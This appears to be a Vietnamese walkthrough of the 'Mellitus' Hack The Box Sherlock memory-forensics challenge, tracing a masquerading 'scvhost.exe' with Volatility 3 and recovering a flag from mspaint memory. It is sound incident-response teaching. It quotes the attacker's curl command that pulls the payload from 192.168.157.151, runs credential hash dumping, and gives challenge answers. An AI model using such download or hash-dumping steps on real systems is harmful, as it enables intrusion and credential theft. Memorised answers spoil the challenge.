![image](https://hackmd.io/_uploads/B1Rf6IPozg.png)
Bạn là SOC nhưng bạn đang trau dồi kỹ năng ứng phó sự cố của mình! Đã đến lúc bạn phải quyết tâm và thực hiện công việc mơ ước của mình với tư cách là IR vì đó là con đường mà bạn muốn sự nghiệp của mình đi theo. Hiện tại, bạn đang trải qua quá trình phỏng vấn cho một nhóm nội bộ IR quy mô trung bình và người ứng phó phỏng vấn tự mãn đã đưa ra cho bạn một thử thách kỹ thuật khó khăn để kiểm tra năng lực điều tra trí nhớ của bạn. Bạn có thể trả lời đúng tất cả các câu hỏi và đảm bảo công việc không?
# Mellitus
## Sherlock info
Name |Mellitus
|-|-|
Difficulty| Medium
Category | DFIR|
## Note from Scenario
Thiết bị ảnh hưởng là máy trạm bị tấn công bằng mã độc, attacker sau khi khai thac được thiết bị còn để lại lời thách thức
## Artifacts
File `.vmem` để thực hiện memory forensics
## Tools use
- vol3
- Gimp

>### Comment
> Bài này ở mức medium ở câu hỏi cuối, khá khoai

# Question
1. What was the time on the system when the memory was captured?
2. What is the IP address of the attacker?
3. What is the name of the strange process?
4. What is the PID of the process that launched the malicious binary?
5. What was the command hat got the malicious binary onto the machine?
6. The attacker attempted to gain entry to our host via FTP. How many users did they attempt?
7. What is the full URL of the last website the attacker visited?
8. What is the affected user’s password?
9. There is a flag hidden related to PID 5116. Can you confirm what it is?
# Analysis
## 2. Thông tin hệ thống
Thời điểm thu thập bộ nhớ nằm trong trường `SystemTime` của plugin `windows.info`. Đây là mốc thời gian chuẩn để đối chiếu mọi sự kiện khác trong bài
```
vol3 -f memory_dump.vmem windows.info
```

```text
Variable                        Value
Kernel Base                     0xf80638aa5000
DTB                             0x1ad000
Is64Bit                         True
IsPAE                           False
layer_name                      0 WindowsIntel32e
memory_layer                    1 VmwareLayer
KdVersionBlock                  0xf80638ea7dc0
Major/Minor                     15.17763
KeNumberProcessors              2
SystemTime                      2023-10-31 13:59:26
NtSystemRoot                    C:\Windows
NtProductType                   NtProductWinNt
NtMajorVersion                  10
NtMinorVersion                  0
```

> Hệ điều hành là Windows 10 64-bit (build 17763), `SystemTime` = **2023-10-31 13:59:26**
## Phân tích kết nối mạng
### Liệt kê kết nối
Dùng plugin `windows.netstat` để xem các kết nối TCP tại thời điểm capture:
```bash
vol3 -f memory_dump.vmem windows.netstat
```

```text
Offset          Proto   LocalAddr        LocalPort  ForeignAddr       ForeignPort  State        PID  Owner  Created
0xc40aaa5d7920  TCPv4   192.168.157.144  50044      204.79.197.222    443          ESTABLISHED  -    -      N/A
0xc40aa5ac6530  TCPv4   127.0.0.1        49867      127.0.0.1         49868        ESTABLISHED  -    -      N/A
0xc40aa9005bf0  TCPv4   127.0.0.1        14147      127.0.0.1         49889        ESTABLISHED  -    -      N/A
0xc40aa90e0bf0  TCPv4   127.0.0.1        49889      127.0.0.1         14147        ESTABLISHED  -    -      N/A
0xc40aa6f40b50  TCPv4   127.0.0.1        49868      127.0.0.1         49867        ESTABLISHED  -    -      N/A
0xc40aa6b569a0  TCPv4   192.168.157.144  49772      20.90.152.133     443          ESTABLISHED  -    -      N/A
0xc40aaa8cb8a0  TCPv4   192.168.157.144  50041      216.58.204.78     443          ESTABLISHED  -    -      N/A
0xc40aaa7f79a0  TCPv4   192.168.157.144  50037      192.168.157.151  4545         ESTABLISHED  -    -      N/A   <-- đáng ngờ
0xc40aa5d25a30  TCPv4   192.168.157.144  50043      142.250.187.206   443          ESTABLISHED  -    -      N/A
0xc40aa912ebe0  TCPv4   192.168.157.144  50042      216.58.204.67     443          ESTABLISHED  -    -      N/A
0xc40aa99986d0  TCPv4   192.168.157.144  50045      13.107.21.200     443          ESTABLISHED  -    -      N/A
```
### Đánh giá
- Các kết nối tới IP public đều dùng cổng **443**, phù hợp với hành vi duyệt web thông thường
- Kết nối tới `192.168.157.151:4545` nổi bật vì cổng `4545` không gắn với service phổ biến nào
- IP này là **địa chỉ nội bộ** nên dễ bị bỏ qua. Tuy nhiên có hai khả năng cần cân nhắc: máy này đã bị compromise và dùng làm bàn đạp, hoặc đây chính là máy của attacker trong cùng mạng lab (rất thường gặp ở các bài HTB)

Không nên kết luận chỉ dựa trên suy đoán, cần có bằng chứng xác thực
### Xác thực bằng `strings` + `grep`
Cách nhanh nhất để kiểm chứng một IP đáng ngờ là trích xuất chuỗi từ memory dump rồi tìm IP đó:
```bash
strings memory_dump.vmem | grep "192.168.157.151"
```
![strings grep IP](https://hackmd.io/_uploads/r1rbguIsfx.png)

Kết quả cho thấy lệnh `curl` tải về một file tên **`scvhost.exe`**. Đây là dấu hiệu rõ ràng của kỹ thuật **masquerading**: tên file chỉ sai một ký tự so với process hệ thống hợp lệ `svchost.exe`. Kết hợp với việc file được tải từ chính IP này, ta có đủ cơ sở xác nhận `192.168.157.151` là máy của attacker
## Truy vết process độc hại
### Xác định process và vị trí file
Dùng `windows.pstree` để xem process tree và đường dẫn thực thi:
```bash
vol3 -f memory_dump.vmem windows.pstree
```
![pstree scvhost.exe](https://hackmd.io/_uploads/BkCKWuIjMg.png)
File thực thi nằm tại `\Users\BantingFG\Downloads\scvhost.exe`. Điều này cho thấy attacker đã hoạt động trong ngữ cảnh user **BantingFG**
### Xác định process cha
Dùng `grep -C 5` để hiển thị 5 dòng xung quanh kết quả khớp:
```bash
vol3 -f memory_dump.vmem windows.pstree | grep -n -C 5 "scvhost.exe"
```
```text
104-******* 6772   1424  powershell.exe  0xc40aa9de7080  11  -  4  False  2023-10-31 13:42:21  N/A
            "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
105:******** 11156  6772  scvhost.exe     0xc40aa8cc8080  0   -  4  True   2023-10-31 13:50:20  2023-10-31 13:51:36
            \Device\HarddiskVolume4\Users\BantingFG\Downloads\scvhost.exe
```
| Process | PID | PPID | Thời gian tạo | Thời gian thoát |
|---|---|---|---|---|
| `powershell.exe` | 6772 | 1424 | 2023-10-31 13:42:21 | N/A (còn chạy) |
| `scvhost.exe` | 11156 | 6772 | 2023-10-31 13:50:20 | 2023-10-31 13:51:36 |

> `scvhost.exe` được sinh ra từ `powershell.exe` (PID 6772) và chỉ chạy khoảng 1 phút 16 giây trước khi kết thúc

### Xác định lệnh tải file
Trong kết quả `strings` có nhiều lần attacker thử tải bằng `curl` và `wget`. Với CTF, có thể thử lần lượt từng lệnh. Cách chuẩn hơn là **dump bộ nhớ của `powershell.exe`** rồi đọc lại lệnh nào được thực thi cuối cùng trước khi chạy file:
```bash
vol3 -f memory_dump.vmem windows.memmap --dump --pid 6772
```
![powershell memory](https://hackmd.io/_uploads/rJEDAuIjGg.png)
Lệnh cuối cùng trước khi file được thực thi:
```bash
curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
```
Như vậy attacker dựng một HTTP server tại port `8000` trên máy `192.168.157.151` để phân phối payload
## Hoạt động brute-force FTP
Khi `grep` theo IP ở phần trước, kết quả chứa nhiều thông điệp đặc trưng của giao thức **FTP**:
![FTP messages](https://hackmd.io/_uploads/HJgGreFLsMe.png)
Lọc thêm với từ khóa `Password required` để xem các username mà attacker đã thử:
![FTP usernames](https://hackmd.io/_uploads/rJRdxF8iGe.png)
> Attacker nhắm tới **3 tài khoản** trong kết quả trên, đây là hành vi dò mật khẩu qua FTP
## Browser Forensics
### Định vị file History
Việc attacker ghi được file vào `Users\BantingFG\Downloads` cho thấy `BantingFG` là tài khoản bị lợi dụng. Do đó ta tìm lịch sử duyệt web của Chrome trong profile của user này. Đường dẫn mặc định:
```text
C:\Users\<Tên_User>\AppData\Local\Google\Chrome\User Data\Default\History
```
![Tìm file History](https://hackmd.io/_uploads/SJoHrFIoMg.png)
### Dump file
Sau khi có địa chỉ ảo của file, dùng `windows.dumpfiles`:
```bash
vol3 -f memory_dump.vmem windows.dumpfiles --virtaddr 0xc40aa9259df0
```
![Dump History](https://hackmd.io/_uploads/B14lDYUsfx.png)
### Phân tích
`History` là cơ sở dữ liệu SQLite. Sắp xếp theo thời gian, ta xác định được trang cuối cùng mà attacker truy cập:
![Trang truy cập cuối](https://hackmd.io/_uploads/rywBwK8ifx.png)
Đó là một bài viết trên Stack Overflow giải thích lỗi của PowerShell khi dùng `Invoke-WebRequest` để tải nội dung từ Internet. Điều này khớp với việc attacker gặp khó khăn khi tải payload bằng PowerShell và phải chuyển sang `curl`
## 7. Xác định tài khoản người dùng
Qua các bằng chứng trên (đường dẫn file, profile Chrome), user liên quan là **`BantingFG`**. Để xác nhận, dùng `windows.hashdump` liệt kê các local account:
```bash
vol3 -f memory_dump.vmem windows.hashdump
```
![hashdump](https://hackmd.io/_uploads/SkIaOFUoMl.png)
![hashdump 2](https://hackmd.io/_uploads/Sky8tFUoGe.png)
## Khôi phục dữ liệu từ `mspaint.exe`
Process `mspaint.exe` có PID **`5116`**:
![mspaint PID](https://hackmd.io/_uploads/BkK0rSDofx.png)
Vùng nhớ của một ứng dụng đồ họa có thể chứa dữ liệu pixel thô của bức ảnh đang được vẽ. Ý tưởng là dump bộ nhớ process rồi diễn giải nó như một ảnh raw:
1. Dump bộ nhớ process (ví dụ `windows.memmap --dump --pid 5116`)
2. Đổi đuôi file `.dmp` thành `.data`
3. Mở bằng **GIMP** (`File > Open`), chọn loại file **Raw image data**
4. Trong hộp thoại import, chọn **Image Type: RGB Alpha** và tinh chỉnh các tham số:
   - **Width**: thay đổi chiều rộng để các dòng pixel khớp nhau (sai width thì ảnh bị xiên hoặc nhiễu)
   - **Height**: chiều cao vùng hiển thị
   - **Offset**: vị trí byte bắt đầu của dữ liệu pixel trong file. Dịch offset để tìm đúng vùng chứa ảnh
![GIMP import](https://hackmd.io/_uploads/By_PwBDoze.png)
![GIMP width/offset](https://hackmd.io/_uploads/HyvD9LPifl.png)
Ban đầu ảnh trông như nhiễu. Sau khi điều chỉnh Width, Height và Offset cho đến khi hình ảnh rõ nét, dòng chữ chứa flag hiện ra:
![Kết quả](https://hackmd.io/_uploads/H1i0hLvoze.png)
––––––––––––––––––––– Kết thúc Sherlock! –––––––––––––––––––––
![image](https://hackmd.io/_uploads/B1JraUvjfg.png)
